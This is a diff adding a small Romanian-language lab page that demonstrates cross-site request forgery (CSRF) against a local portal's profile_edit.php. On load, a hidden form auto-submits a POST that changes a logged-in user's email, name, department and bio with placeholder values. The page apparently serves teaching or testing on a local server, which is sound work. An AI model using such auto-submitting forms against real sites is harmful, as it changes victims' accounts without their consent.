@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+<meta charset="UTF-8">
+<title>CSRF demo (lab)</title>
+</head>
+<body>
+<p>Pagină <strong>„atacator”</strong> servită pe <strong>același host</strong> ca portalul → browserul trimite cookie-ul de sesiune la POST.</p>
+<p><strong>Nu</strong> deschide ca <code>file://</code> (de obicei nu merge din cauza SameSite).</p>
+<p>Deschizi în browser:</p>
+<pre>http://127.0.0.1:8080/lab_csrf_demo.html</pre>
+<p>(același server <code>php -S 127.0.0.1:8080</code> ca pentru site)</p>
+<form id="evil" method="POST" action="profile_edit.php">
+  <input type="hidden" name="email" value="csrf-demo@example.invalid">
+  <input type="hidden" name="full_name" value="CSRF demo">
+  <input type="hidden" name="department" value="general">
+  <input type="hidden" name="bio" value="modified without consent (lab demo)">
+</form>
+<script>document.getElementById('evil').submit();</script>
+</body>
+</html>
